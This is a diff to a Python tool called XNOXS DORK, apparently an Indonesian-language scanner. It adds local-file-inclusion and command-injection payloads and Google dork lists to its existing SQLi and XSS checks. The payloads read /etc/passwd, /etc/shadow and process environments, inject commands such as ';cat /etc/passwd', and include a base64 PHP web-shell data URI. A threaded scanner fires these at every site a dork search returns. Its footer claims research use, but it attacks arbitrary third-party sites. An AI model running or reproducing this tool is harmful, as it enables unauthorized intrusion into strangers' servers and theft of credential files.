@@ -548,6 +548,203 @@ all_vulnerabilities = []
 all_xss_vulnerabilities = []
 all_dom_xss_vulnerabilities = []
 all_blind_sqli_vulnerabilities = []
+all_lfi_vulnerabilities = []
+all_rce_vulnerabilities = []
+
+LFI_PAYLOADS = [
+    '../etc/passwd',
+    '....//....//....//....//....//etc/passwd',
+    '..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd',
+    '....//....//....//....//....//windows/win.ini',
+    '/etc/passwd',
+    '/etc/shadow',
+    '/etc/hosts',
+    '/proc/self/environ',
+    '/proc/version',
+    '/proc/cmdline',
+    'C:\\Windows\\win.ini',
+    'C:\\Windows\\System32\\drivers\\etc\\hosts',
+    '..\\..\\..\\..\\..\\windows\\win.ini',
+    '....\\....\\....\\....\\....\\windows\\win.ini',
+    '/var/log/apache2/access.log',
+    '/var/log/apache/access.log',
+    '/var/log/httpd/access_log',
+    '/var/log/nginx/access.log',
+    'php://filter/convert.base64-encode/resource=index.php',
+    'php://filter/convert.base64-encode/resource=../config.php',
+    'php://input',
+    'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=',
+    'expect://id',
+    'file:///etc/passwd',
+    '/etc/passwd%00',
+    '....//....//....//....//....//etc/passwd%00',
+]
+
+LFI_DETECTION_PATTERNS = {
+    'Linux': [
+        r'root:.*:0:0:',
+        r'daemon:.*:1:1:',
+        r'bin:.*:2:2:',
+        r'sys:.*:3:3:',
+        r'nobody:.*:65534:',
+        r'/bin/bash',
+        r'/bin/sh',
+        r'Linux version',
+        r'/usr/sbin/nologin',
+    ],
+    'Windows': [
+        r'\[extensions\]',
+        r'\[fonts\]',
+        r'\[mci extensions\]',
+        r'for 16-bit app support',
+        r'\[Mail\]',
+        r'\[files\]',
+        r'MAPI=1',
+    ],
+    'Apache Log': [
+        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}.*GET.*HTTP',
+        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}.*POST.*HTTP',
+        r'Mozilla/\d\.\d',
+    ],
+    'PHP Source': [
+        r'<\?php',
+        r'<\?=',
+        r'\$_GET\[',
+        r'\$_POST\[',
+        r'\$_REQUEST\[',
+        r'include\s*\(',
+        r'require\s*\(',
+        r'include_once\s*\(',
+        r'require_once\s*\(',
+    ],
+    'Config File': [
+        r'DB_HOST\s*=',
+        r'DB_USER\s*=',
+        r'DB_PASS\s*=',
+        r'database.*password',
+        r'mysql_connect\s*\(',
+        r'mysqli_connect\s*\(',
+    ],
+    'Proc Info': [
+        r'DOCUMENT_ROOT=',
+        r'HTTP_HOST=',
+        r'SERVER_SOFTWARE=',
+        r'PATH=/',
+    ],
+}
+
+RCE_PAYLOADS = [
+    (';id', 'uid='),
+    ('|id', 'uid='),
+    ('`id`', 'uid='),
+    ('$(id)', 'uid='),
+    (';cat /etc/passwd', 'root:'),
+    ('|cat /etc/passwd', 'root:'),
+    ('`cat /etc/passwd`', 'root:'),
+    ('$(cat /etc/passwd)', 'root:'),
+    (';uname -a', 'Linux'),
+    ('|uname -a', 'Linux'),
+    (';whoami', None),
+    ('|whoami', None),
+    ('`whoami`', None),
+    ('$(whoami)', None),
+    ('&& id', 'uid='),
+    ('|| id', 'uid='),
+    (';ls -la', 'total'),
+    ('|ls -la', 'total'),
+    (';pwd', '/'),
+    ('|pwd', '/'),
+    ('& ping -c 1 127.0.0.1', 'bytes from'),
+    ('| ping -c 1 127.0.0.1', 'bytes from'),
+    (';echo XNOXS_RCE_TEST', 'XNOXS_RCE_TEST'),
+    ('|echo XNOXS_RCE_TEST', 'XNOXS_RCE_TEST'),
+    ('`echo XNOXS_RCE_TEST`', 'XNOXS_RCE_TEST'),
+    ('$(echo XNOXS_RCE_TEST)', 'XNOXS_RCE_TEST'),
+    ("'; echo XNOXS_RCE_TEST; '", 'XNOXS_RCE_TEST'),
+    ('"; echo XNOXS_RCE_TEST; "', 'XNOXS_RCE_TEST'),
+    ('%0Aid', 'uid='),
+    ('%0a id', 'uid='),
+    ('dir', '<DIR>'),
+    ('&dir', '<DIR>'),
+    ('|dir', '<DIR>'),
+    ('& type C:\\Windows\\win.ini', '[extensions]'),
+    ('| type C:\\Windows\\win.ini', '[extensions]'),
+]
+
+RCE_DETECTION_PATTERNS = [
+    r'uid=\d+\([a-zA-Z0-9_-]+\)\s+gid=\d+',
+    r'root:.*:0:0:',
+    r'Linux\s+\S+\s+\d+\.\d+',
+    r'Darwin\s+\S+\s+\d+\.\d+',
+    r'FreeBSD\s+\S+\s+\d+\.\d+',
+    r'total\s+\d+',
+    r'drwx[rwx-]{6}',
+    r'-rw[rwx-]{7}',
+    r'XNOXS_RCE_TEST',
+    r'bytes from 127\.0\.0\.1',
+    r'<DIR>\s+\.',
+    r'\[extensions\]',
+    r'Volume in drive',
+    r'Directory of',
+]
+
+SAMPLE_DORKS = {
+    'SQL Injection': [
+        'inurl:php?id=',
+        'inurl:index.php?id=',
+        'inurl:product.php?id=',
+        'inurl:news.php?id=',
+        'inurl:article.php?id=',
+        'inurl:view.php?id=',
+        'inurl:page.php?id=',
+        'inurl:category.php?id=',
+        'inurl:item.php?id=',
+        'inurl:gallery.php?id=',
+    ],
+    'LFI (Local File Inclusion)': [
+        'inurl:page= filetype:php',
+        'inurl:file= filetype:php',
+        'inurl:include= filetype:php',
+        'inurl:document= filetype:php',
+        'inurl:folder= filetype:php',
+        'inurl:path= filetype:php',
+        'inurl:pg= filetype:php',
+        'inurl:style= filetype:php',
+        'inurl:template= filetype:php',
+        'inurl:php?load=',
+        'inurl:php?read=',
+        'inurl:php?content=',
+        'inurl:download.php?file=',
+        'inurl:show.php?file=',
+        'inurl:readfile.php?file=',
+    ],
+    'RCE (Remote Code Execution)': [
+        'inurl:cmd= filetype:php',
+        'inurl:exec= filetype:php',
+        'inurl:command= filetype:php',
+        'inurl:execute= filetype:php',
+        'inurl:ping= filetype:php',
+        'inurl:query= filetype:php',
+        'inurl:shell= filetype:php',
+        'inurl:process= filetype:php',
+        'inurl:run= filetype:php',
+        'inurl:system= filetype:php',
+        'inurl:do= filetype:php',
+        'inurl:func= filetype:php',
+    ],
+    'XSS (Cross-Site Scripting)': [
+        'inurl:search= filetype:php',
+        'inurl:q= filetype:php',
+        'inurl:query= filetype:php',
+        'inurl:keyword= filetype:php',
+        'inurl:message= filetype:php',
+        'inurl:comment= filetype:php',
+        'inurl:name= filetype:php',
+        'inurl:email= filetype:php',
+        'inurl:feedback= filetype:php',
+        'inurl:review= filetype:php',
+    ],
+}
 
 BLIND_SQLI_PAYLOADS = [
     ("' AND '1'='1", "' AND '1'='2"),
@@ -578,12 +775,16 @@ def export_to_json(filename=None):
             "sqli": len(all_vulnerabilities),
             "blind_sqli": len(all_blind_sqli_vulnerabilities),
             "xss": len(all_xss_vulnerabilities),
-            "dom_xss": len(all_dom_xss_vulnerabilities)
+            "dom_xss": len(all_dom_xss_vulnerabilities),
+            "lfi": len(all_lfi_vulnerabilities),
+            "rce": len(all_rce_vulnerabilities)
         },
         "sql_injection": all_vulnerabilities,
         "blind_sql_injection": all_blind_sqli_vulnerabilities,
         "reflected_xss": all_xss_vulnerabilities,
-        "dom_xss": all_dom_xss_vulnerabilities
+        "dom_xss": all_dom_xss_vulnerabilities,
+        "lfi": all_lfi_vulnerabilities,
+        "rce": all_rce_vulnerabilities
     }
     
     with open(filename, 'w', encoding='utf-8') as f:
@@ -616,6 +817,14 @@ def export_to_csv(filename=None):
         for vuln in all_dom_xss_vulnerabilities:
             writer.writerow(['DOM XSS', vuln['url'], '-',
                            f"Source: {vuln['source']}, Sink: {vuln['sink']}", 'High'])
+        
+        for vuln in all_lfi_vulnerabilities:
+            writer.writerow(['LFI', vuln['url'], vuln['parameter'],
+                           f"File: {vuln['file_type']}, Payload: {vuln['payload'][:30]}", 'Critical'])
+        
+        for vuln in all_rce_vulnerabilities:
+            writer.writerow(['RCE', vuln['url'], vuln['parameter'],
+                           f"Payload: {vuln['payload'][:30]}", 'Critical'])
     
     return filename
 
@@ -626,7 +835,8 @@ def export_to_html(filename=None):
         filename = f"xnoxs_results_{timestamp}.html"
     
     total_vulns = (len(all_vulnerabilities) + len(all_blind_sqli_vulnerabilities) + 
-                   len(all_xss_vulnerabilities) + len(all_dom_xss_vulnerabilities))
+                   len(all_xss_vulnerabilities) + len(all_dom_xss_vulnerabilities) +
+                   len(all_lfi_vulnerabilities) + len(all_rce_vulnerabilities))
     
     html_content = f"""<!DOCTYPE html>
 <html lang="en">
@@ -639,14 +849,20 @@ def export_to_html(filename=None):
         .container {{ max-width: 1200px; margin: 0 auto; }}
         h1 {{ color: #e94560; text-align: center; }}
         h2 {{ color: #0f3460; background: #e94560; padding: 10px; border-radius: 5px; }}
+        h2.lfi {{ background: #27ae60; }}
+        h2.rce {{ background: #c0392b; }}
         .summary {{ display: flex; justify-content: space-around; margin: 20px 0; flex-wrap: wrap; }}
-        .stat {{ background: #16213e; padding: 20px; border-radius: 10px; text-align: center; min-width: 150px; margin: 10px; }}
+        .stat {{ background: #16213e; padding: 20px; border-radius: 10px; text-align: center; min-width: 120px; margin: 10px; }}
         .stat h3 {{ margin: 0; font-size: 2em; }}
         .critical {{ color: #e94560; }}
         .high {{ color: #f39c12; }}
+        .lfi {{ color: #27ae60; }}
+        .rce {{ color: #c0392b; }}
         .vuln-card {{ background: #16213e; margin: 10px 0; padding: 15px; border-radius: 5px; border-left: 4px solid #e94560; }}
         .vuln-card.xss {{ border-left-color: #f39c12; }}
         .vuln-card.dom {{ border-left-color: #9b59b6; }}
+        .vuln-card.lfi {{ border-left-color: #27ae60; }}
+        .vuln-card.rce {{ border-left-color: #c0392b; }}
         .label {{ color: #888; font-size: 0.9em; }}
         .value {{ color: #fff; word-break: break-all; }}
         table {{ width: 100%; border-collapse: collapse; margin: 20px 0; }}
@@ -665,6 +881,8 @@ def export_to_html(filename=None):
             <div class="stat"><h3 class="critical">{len(all_blind_sqli_vulnerabilities)}</h3><p>Blind SQLi</p></div>
             <div class="stat"><h3 class="high">{len(all_xss_vulnerabilities)}</h3><p>Reflected XSS</p></div>
             <div class="stat"><h3 class="high">{len(all_dom_xss_vulnerabilities)}</h3><p>DOM XSS</p></div>
+            <div class="stat"><h3 class="lfi">{len(all_lfi_vulnerabilities)}</h3><p>LFI</p></div>
+            <div class="stat"><h3 class="rce">{len(all_rce_vulnerabilities)}</h3><p>RCE</p></div>
             <div class="stat"><h3>{total_vulns}</h3><p>Total</p></div>
         </div>
 """
@@ -709,9 +927,31 @@ def export_to_html(filename=None):
             <p><span class="label">Sink:</span> <span class="value">{html.escape(vuln['sink'])}</span></p>
         </div>"""
     
+    if all_lfi_vulnerabilities:
+        html_content += "<h2 class='lfi'>LFI (Local File Inclusion) Vulnerabilities</h2>"
+        for vuln in all_lfi_vulnerabilities:
+            html_content += f"""
+        <div class="vuln-card lfi">
+            <p><span class="label">URL:</span> <span class="value">{html.escape(vuln['url'])}</span></p>
+            <p><span class="label">Parameter:</span> <span class="value">{html.escape(vuln['parameter'])}</span></p>
+            <p><span class="label">File Type:</span> <span class="value">{html.escape(vuln['file_type'])}</span></p>
+            <p><span class="label">Payload:</span> <span class="value">{html.escape(vuln['payload'])}</span></p>
+        </div>"""
+    
+    if all_rce_vulnerabilities:
+        html_content += "<h2 class='rce'>RCE (Remote Code Execution) Vulnerabilities</h2>"
+        for vuln in all_rce_vulnerabilities:
+            html_content += f"""
+        <div class="vuln-card rce">
+            <p><span class="label">URL:</span> <span class="value">{html.escape(vuln['url'])}</span></p>
+            <p><span class="label">Parameter:</span> <span class="value">{html.escape(vuln['parameter'])}</span></p>
+            <p><span class="label">Payload:</span> <span class="value">{html.escape(vuln['payload'])}</span></p>
+            <p><span class="label">Evidence:</span> <span class="value">{html.escape(vuln.get('evidence', 'N/A'))}</span></p>
+        </div>"""
+    
     html_content += """
         <div class="footer">
-            <p>Generated by XNOXS DORK - SQLi & XSS Vulnerability Scanner</p>
+            <p>Generated by XNOXS DORK - Multi-Vulnerability Scanner</p>
             <p>For Security Research Purposes Only</p>
         </div>
     </div>
@@ -1116,6 +1356,204 @@ def scan_xss(url, timeout=10, silent=False):
     return xss_vulns
 
 
+def detect_lfi(response_text):
+    """Detect LFI vulnerability from response."""
+    for file_type, patterns in LFI_DETECTION_PATTERNS.items():
+        for pattern in patterns:
+            match = re.search(pattern, response_text, re.IGNORECASE)
+            if match:
+                start = max(0, match.start() - 30)
+                end = min(len(response_text), match.end() + 50)
+                snippet = response_text[start:end].strip()
+                snippet = re.sub(r'<[^>]+>', '', snippet)
+                return file_type, snippet
+    return None, None
+
+
+def detect_rce(response_text, expected_output=None):
+    """Detect RCE vulnerability from response."""
+    if expected_output and expected_output in response_text:
+        return True, expected_output
+    
+    for pattern in RCE_DETECTION_PATTERNS:
+        match = re.search(pattern, response_text, re.IGNORECASE)
+        if match:
+            start = max(0, match.start() - 20)
+            end = min(len(response_text), match.end() + 50)
+            snippet = response_text[start:end].strip()
+            snippet = re.sub(r'<[^>]+>', '', snippet)
+            return True, snippet
+    
+    return False, None
+
+
+def inject_lfi_payload(url, payload):
+    """Inject LFI payload into URL parameters."""
+    parsed = urllib.parse.urlparse(url)
+    
+    if parsed.query:
+        params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
+        injected_urls = []
+        
+        for param in params:
+            new_params = params.copy()
+            new_params[param] = [payload]
+            
+            new_query = urllib.parse.urlencode(new_params, doseq=True)
+            injected_url = urllib.parse.urlunparse((
+                parsed.scheme,
+                parsed.netloc,
+                parsed.path,
+                parsed.params,
+                new_query,
+                parsed.fragment
+            ))
+            injected_urls.append((param, injected_url, payload))
+        
+        return injected_urls
+    else:
+        return []
+
+
+def scan_lfi(url, timeout=10, silent=False):
+    """Scan for Local File Inclusion vulnerabilities."""
+    lfi_vulns = []
+    tested_params = set()
+    
+    for payload in LFI_PAYLOADS[:15]:
+        injected_urls = inject_lfi_payload(url, payload)
+        
+        for param_name, injected_url, used_payload in injected_urls:
+            if param_name in tested_params:
+                continue
+            
+            response_text = test_url(injected_url, timeout)
+            
+            if response_text:
+                file_type, snippet = detect_lfi(response_text)
+                
+                if file_type:
+                    vuln = {
+                        'url': injected_url,
+                        'parameter': param_name,
+                        'file_type': file_type,
+                        'payload': used_payload,
+                        'evidence': snippet[:100] if snippet else ''
+                    }
+                    lfi_vulns.append(vuln)
+                    with thread_lock:
+                        all_lfi_vulnerabilities.append(vuln)
+                    tested_params.add(param_name)
+                    if not silent:
+                        with thread_lock:
+                            print_lfi_vuln(injected_url, param_name, file_type, used_payload)
+                    break
+        
+        if lfi_vulns:
+            break
+    
+    return lfi_vulns
+
+
+def inject_rce_payload(url, payload):
+    """Inject RCE payload into URL parameters."""
+    parsed = urllib.parse.urlparse(url)
+    
+    if parsed.query:
+        params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
+        injected_urls = []
+        
+        for param in params:
+            new_params = params.copy()
+            original_value = new_params[param][0] if new_params[param] else ''
+            new_params[param] = [original_value + payload]
+            
+            new_query = urllib.parse.urlencode(new_params, doseq=True)
+            injected_url = urllib.parse.urlunparse((
+                parsed.scheme,
+                parsed.netloc,
+                parsed.path,
+                parsed.params,
+                new_query,
+                parsed.fragment
+            ))
+            injected_urls.append((param, injected_url))
+        
+        return injected_urls
+    else:
+        return []
+
+
+def scan_rce(url, timeout=10, silent=False):
+    """Scan for Remote Code Execution vulnerabilities."""
+    rce_vulns = []
+    tested_params = set()
+    
+    for payload, expected_output in RCE_PAYLOADS[:15]:
+        injected_urls = inject_rce_payload(url, payload)
+        
+        for param_name, injected_url in injected_urls:
+            if param_name in tested_params:
+                continue
+            
+            response_text = test_url(injected_url, timeout)
+            
+            if response_text:
+                is_rce, evidence = detect_rce(response_text, expected_output)
+                
+                if is_rce:
+                    vuln = {
+                        'url': injected_url,
+                        'parameter': param_name,
+                        'payload': payload,
+                        'evidence': evidence[:100] if evidence else ''
+                    }
+                    rce_vulns.append(vuln)
+                    with thread_lock:
+                        all_rce_vulnerabilities.append(vuln)
+                    tested_params.add(param_name)
+                    if not silent:
+                        with thread_lock:
+                            print_rce_vuln(injected_url, param_name, payload, evidence)
+                    break
+        
+        if rce_vulns:
+            break
+    
+    return rce_vulns
+
+
+def print_lfi_vuln(url, param, file_type, payload):
+    """Print LFI vulnerability found."""
+    payload_display = payload[:45] if len(payload) > 45 else payload
+    print(f"""
+    {Fore.GREEN}╔{'═'*66}╗
+    ║{Back.GREEN}{Fore.BLACK}  VULNERABLE  {Style.RESET_ALL}{Fore.GREEN}║ LFI (Local File Inclusion) Detected!         ║
+    ╠{'═'*66}╣{Style.RESET_ALL}
+    {Fore.GREEN}║{Fore.YELLOW} URL:{Style.RESET_ALL} {url[:58]}{'...' if len(url) > 58 else ''}{' ' * max(0, 58 - len(url[:58]))} {Fore.GREEN}║
+    {Fore.GREEN}║{Fore.YELLOW} Parameter:{Style.RESET_ALL} {param}{' ' * (51 - len(param))} {Fore.GREEN}║
+    {Fore.GREEN}║{Fore.YELLOW} File Type:{Style.RESET_ALL} {file_type}{' ' * (51 - len(file_type))} {Fore.GREEN}║
+    {Fore.GREEN}║{Fore.YELLOW} Payload:{Style.RESET_ALL} {payload_display}{' ' * max(0, 53 - len(payload_display))} {Fore.GREEN}║
+    {Fore.GREEN}╚{'═'*66}╝{Style.RESET_ALL}
+""")
+
+
+def print_rce_vuln(url, param, payload, evidence):
+    """Print RCE vulnerability found."""
+    payload_display = payload[:45] if len(payload) > 45 else payload
+    evidence_display = (evidence[:45] if evidence and len(evidence) > 45 else evidence) or 'N/A'
+    print(f"""
+    {Fore.RED}{Back.WHITE}╔{'═'*66}╗
+    ║{Back.RED}{Fore.WHITE}  CRITICAL!   {Style.RESET_ALL}{Fore.RED}{Back.WHITE}║ RCE (Remote Code Execution) Detected!        ║
+    ╠{'═'*66}╣{Style.RESET_ALL}
+    {Fore.RED}║{Fore.YELLOW} URL:{Style.RESET_ALL} {url[:58]}{'...' if len(url) > 58 else ''}{' ' * max(0, 58 - len(url[:58]))} {Fore.RED}║
+    {Fore.RED}║{Fore.YELLOW} Parameter:{Style.RESET_ALL} {param}{' ' * (51 - len(param))} {Fore.RED}║
+    {Fore.RED}║{Fore.YELLOW} Payload:{Style.RESET_ALL} {payload_display}{' ' * max(0, 53 - len(payload_display))} {Fore.RED}║
+    {Fore.RED}║{Fore.YELLOW} Evidence:{Style.RESET_ALL} {evidence_display}{' ' * max(0, 52 - len(evidence_display))} {Fore.RED}║
+    {Fore.RED}╚{'═'*66}╝{Style.RESET_ALL}
+""")
+
+
 def inject_payload(url, payload="'"):
     parsed = urllib.parse.urlparse(url)
     
@@ -1223,7 +1661,19 @@ def scan_url(url, timeout=10, silent=False, include_blind=True):
     
     dom_vulns = scan_dom_xss(url, timeout, silent)
     
-    return vulnerabilities, blind_vulns, xss_vulns, dom_vulns
+    if not silent:
+        with thread_lock:
+            print_info(f"{Fore.GREEN}[LFI (Local File Inclusion) Scan]{Style.RESET_ALL}")
+    
+    lfi_vulns = scan_lfi(url, timeout, silent)
+    
+    if not silent:
+        with thread_lock:
+            print_info(f"{Fore.RED}[RCE (Remote Code Execution) Scan]{Style.RESET_ALL}")
+    
+    rce_vulns = scan_rce(url, timeout, silent)
+    
+    return vulnerabilities, blind_vulns, xss_vulns, dom_vulns, lfi_vulns, rce_vulns
 
 
 def scan_url_threaded(url, timeout=10):
@@ -1236,26 +1686,30 @@ def multi_threaded_scan(urls, timeout=10, num_threads=5):
         'blind_vulns': 0,
         'xss_vulns': 0,
         'dom_vulns': 0,
+        'lfi_vulns': 0,
+        'rce_vulns': 0,
         'scanned': 0
     }
     
     def scan_worker(url):
         try:
-            sql, blind, xss, dom = scan_url_threaded(url, timeout)
-            return len(sql), len(blind), len(xss), len(dom), url
+            sql, blind, xss, dom, lfi, rce = scan_url_threaded(url, timeout)
+            return len(sql), len(blind), len(xss), len(dom), len(lfi), len(rce), url
         except Exception:
-            return 0, 0, 0, 0, url
+            return 0, 0, 0, 0, 0, 0, url
     
     with ThreadPoolExecutor(max_workers=num_threads) as executor:
         futures = {executor.submit(scan_worker, url): url for url in urls}
         
         for future in as_completed(futures):
             try:
-                sql_count, blind_count, xss_count, dom_count, scanned_url = future.result()
+                sql_count, blind_count, xss_count, dom_count, lfi_count, rce_count, scanned_url = future.result()
                 results['sql_vulns'] += sql_count
                 results['blind_vulns'] += blind_count
                 results['xss_vulns'] += xss_count
                 results['dom_vulns'] += dom_count
+                results['lfi_vulns'] += lfi_count
+                results['rce_vulns'] += rce_count
                 results['scanned'] += 1
                 
                 with thread_lock:
@@ -1270,6 +1724,10 @@ def multi_threaded_scan(urls, timeout=10, num_threads=5):
                         status_parts.append(f"{Fore.MAGENTA}XSS:{xss_count}{Style.RESET_ALL}")
                     if dom_count > 0:
                         status_parts.append(f"{Fore.YELLOW}DOM:{dom_count}{Style.RESET_ALL}")
+                    if lfi_count > 0:
+                        status_parts.append(f"{Fore.GREEN}LFI:{lfi_count}{Style.RESET_ALL}")
+                    if rce_count > 0:
+                        status_parts.append(f"{Fore.RED}{Back.WHITE}RCE:{rce_count}{Style.RESET_ALL}")
                     
                     if status_parts:
                         print(f"\n    {Fore.GREEN}[+]{Style.RESET_ALL} {scanned_url[:50]}... [{', '.join(status_parts)}]")
@@ -1333,15 +1791,28 @@ def menu_dork_scan():
     print_banner()
     
     print(f"""
-    {Fore.CYAN}┌────────────────────────────────────────────────────────────────────┐
-    │  {Fore.YELLOW}◆  GOOGLE DORK SCANNER{Fore.CYAN}                                           │
-    └────────────────────────────────────────────────────────────────────┘
+    {Fore.CYAN}╔════════════════════════════════════════════════════════════════════╗
+    ║  {Fore.YELLOW}◆  GOOGLE DORK SCANNER{Fore.CYAN}                                           ║
+    ╠════════════════════════════════════════════════════════════════════╣
+    ║  {Fore.YELLOW}[1]{Fore.WHITE} Masukkan Dork Manual                                        {Fore.CYAN}║
+    ║  {Fore.YELLOW}[2]{Fore.WHITE} Lihat Sample Dorks                                          {Fore.CYAN}║
+    ║  {Fore.YELLOW}[0]{Fore.WHITE} Kembali                                                     {Fore.CYAN}║
+    ╚════════════════════════════════════════════════════════════════════╝
 {Style.RESET_ALL}""")
     
-    print(f"    {Fore.WHITE}Contoh dork:{Style.RESET_ALL}")
+    choice = input(f"    {Fore.YELLOW}➤{Style.RESET_ALL} Pilih opsi: ").strip()
+    
+    if choice == '0':
+        return
+    
+    if choice == '2':
+        menu_sample_dorks()
+        return
+    
+    print(f"\n    {Fore.WHITE}Contoh dork:{Style.RESET_ALL}")
     print(f"    {Fore.GREEN}•{Style.RESET_ALL} inurl:php?id=")
-    print(f"    {Fore.GREEN}•{Style.RESET_ALL} inurl:product.php?id=")
-    print(f"    {Fore.GREEN}•{Style.RESET_ALL} site:example.com inurl:?id=")
+    print(f"    {Fore.GREEN}•{Style.RESET_ALL} inurl:page= filetype:php (LFI)")
+    print(f"    {Fore.GREEN}•{Style.RESET_ALL} inurl:cmd= filetype:php (RCE)")
     print()
     
     dork = input(f"    {Fore.YELLOW}➤{Style.RESET_ALL} Masukkan Google Dork: ").strip()
@@ -1351,6 +1822,63 @@ def menu_dork_scan():
         input(f"\n    {Fore.CYAN}Tekan Enter untuk kembali...{Style.RESET_ALL}")
         return
     
+    run_dork_scan(dork)
+
+
+def menu_sample_dorks():
+    """Display sample dorks by category."""
+    clear_screen()
+    print_banner()
+    
+    print(f"""
+    {Fore.CYAN}╔════════════════════════════════════════════════════════════════════╗
+    ║  {Fore.YELLOW}◆  SAMPLE DORKS BY CATEGORY{Fore.CYAN}                                       ║
+    ╠════════════════════════════════════════════════════════════════════╣""")
+    
+    categories = list(SAMPLE_DORKS.keys())
+    for i, category in enumerate(categories, 1):
+        print(f"    {Fore.CYAN}║  {Fore.YELLOW}[{i}]{Fore.WHITE} {category:<60}{Fore.CYAN}║")
+    
+    print(f"""    {Fore.CYAN}╠════════════════════════════════════════════════════════════════════╣
+    ║  {Fore.YELLOW}[0]{Fore.WHITE} Kembali                                                     {Fore.CYAN}║
+    ╚════════════════════════════════════════════════════════════════════╝
+{Style.RESET_ALL}""")
+    
+    choice = input(f"    {Fore.YELLOW}➤{Style.RESET_ALL} Pilih kategori: ").strip()
+    
+    if choice == '0':
+        return
+    
+    try:
+        idx = int(choice) - 1
+        if 0 <= idx < len(categories):
+            category = categories[idx]
+            dorks = SAMPLE_DORKS[category]
+            
+            clear_screen()
+            print_banner()
+            print(f"\n    {Fore.CYAN}═══ {category} SAMPLE DORKS ═══{Style.RESET_ALL}\n")
+            
+            for i, dork in enumerate(dorks, 1):
+                print(f"    {Fore.YELLOW}[{i:2}]{Style.RESET_ALL} {dork}")
+            
+            print()
+            dork_choice = input(f"    {Fore.YELLOW}➤{Style.RESET_ALL} Pilih dork (nomor) atau ketik manual: ").strip()
+            
+            if dork_choice.isdigit():
+                dork_idx = int(dork_choice) - 1
+                if 0 <= dork_idx < len(dorks):
+                    run_dork_scan(dorks[dork_idx])
+                    return
+            elif dork_choice:
+                run_dork_scan(dork_choice)
+                return
+    except (ValueError, IndexError):
+        pass
+
+
+def run_dork_scan(dork):
+    """Execute dork scan with the given dork."""
     print_divider()
     print_info(f"Mencari: {Fore.YELLOW}{dork}{Style.RESET_ALL}")
     
@@ -1362,14 +1890,16 @@ def menu_dork_scan():
     if urls:
         print_divider()
         print_info(f"Memulai scan {len(urls)} URL dengan {Fore.GREEN}{settings['threads']} threads{Style.RESET_ALL}")
-        print_info(f"Scan: SQL Injection + Reflected XSS + DOM-based XSS")
+        print_info(f"Scan: SQLi + XSS + LFI + RCE")
         print()
         
         results = multi_threaded_scan(urls, settings['timeout'], settings['threads'])
         
         print_divider()
         blind_vulns = results.get('blind_vulns', 0)
-        total_vulns = results['sql_vulns'] + blind_vulns + results['xss_vulns'] + results['dom_vulns']
+        lfi_vulns = results.get('lfi_vulns', 0)
+        rce_vulns = results.get('rce_vulns', 0)
+        total_vulns = results['sql_vulns'] + blind_vulns + results['xss_vulns'] + results['dom_vulns'] + lfi_vulns + rce_vulns
         print(f"""
     {Fore.CYAN}╔{'═'*66}╗
     ║{Fore.GREEN}                      SCAN SELESAI                               {Fore.CYAN}║
@@ -1379,6 +1909,9 @@ def menu_dork_scan():
     ║{Fore.WHITE}  Blind SQLi Found     : {Fore.RED if blind_vulns > 0 else Fore.GREEN}{blind_vulns:<40}{Fore.CYAN}║
     ║{Fore.WHITE}  Reflected XSS Found  : {Fore.MAGENTA if results['xss_vulns'] > 0 else Fore.GREEN}{results['xss_vulns']:<40}{Fore.CYAN}║
     ║{Fore.WHITE}  DOM-based XSS Found  : {Fore.YELLOW if results['dom_vulns'] > 0 else Fore.GREEN}{results['dom_vulns']:<40}{Fore.CYAN}║
+    ║{Fore.WHITE}  LFI Found            : {Fore.GREEN if lfi_vulns > 0 else Fore.GREEN}{lfi_vulns:<40}{Fore.CYAN}║
+    ║{Fore.WHITE}  RCE Found            : {Fore.RED if rce_vulns > 0 else Fore.GREEN}{rce_vulns:<40}{Fore.CYAN}║
+    ╠{'═'*66}╣
     ║{Fore.WHITE}  Total Vulnerability  : {Fore.RED if total_vulns > 0 else Fore.GREEN}{total_vulns:<40}{Fore.CYAN}║
     ╚{'═'*66}╝{Style.RESET_ALL}
 """)
@@ -1419,14 +1952,14 @@ def menu_single_url():
     import urllib3
     urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
     
-    loading_animation("Menyiapkan scan (SQLi + Reflected XSS + DOM XSS)...", 1)
+    loading_animation("Menyiapkan scan (SQLi + XSS + LFI + RCE)...", 1)
     
-    sql_vulns, blind_vulns, xss_vulns, dom_vulns = scan_url(url, settings['timeout'])
+    sql_vulns, blind_vulns, xss_vulns, dom_vulns, lfi_vulns, rce_vulns = scan_url(url, settings['timeout'])
     
     print_divider()
-    total_vulns = len(sql_vulns) + len(blind_vulns) + len(xss_vulns) + len(dom_vulns)
+    total_vulns = len(sql_vulns) + len(blind_vulns) + len(xss_vulns) + len(dom_vulns) + len(lfi_vulns) + len(rce_vulns)
     if total_vulns > 0:
-        print_success(f"Ditemukan: {Fore.RED}{len(sql_vulns)}{Style.RESET_ALL} SQLi, {Fore.RED}{len(blind_vulns)}{Style.RESET_ALL} Blind, {Fore.MAGENTA}{len(xss_vulns)}{Style.RESET_ALL} XSS, {Fore.YELLOW}{len(dom_vulns)}{Style.RESET_ALL} DOM")
+        print_success(f"Ditemukan: {Fore.RED}{len(sql_vulns)}{Style.RESET_ALL} SQLi, {Fore.RED}{len(blind_vulns)}{Style.RESET_ALL} Blind, {Fore.MAGENTA}{len(xss_vulns)}{Style.RESET_ALL} XSS, {Fore.YELLOW}{len(dom_vulns)}{Style.RESET_ALL} DOM, {Fore.GREEN}{len(lfi_vulns)}{Style.RESET_ALL} LFI, {Fore.RED}{len(rce_vulns)}{Style.RESET_ALL} RCE")
     else:
         print_warning("Tidak ada vulnerability ditemukan.")
     
@@ -1444,13 +1977,14 @@ def menu_view_results():
 {Style.RESET_ALL}""")
     
     total_vulns = (len(all_vulnerabilities) + len(all_blind_sqli_vulnerabilities) + 
-                   len(all_xss_vulnerabilities) + len(all_dom_xss_vulnerabilities))
+                   len(all_xss_vulnerabilities) + len(all_dom_xss_vulnerabilities) +
+                   len(all_lfi_vulnerabilities) + len(all_rce_vulnerabilities))
     
     if total_vulns == 0:
         print_warning("Belum ada vulnerability yang ditemukan.")
         print_info("Lakukan scan terlebih dahulu untuk melihat hasil.")
     else:
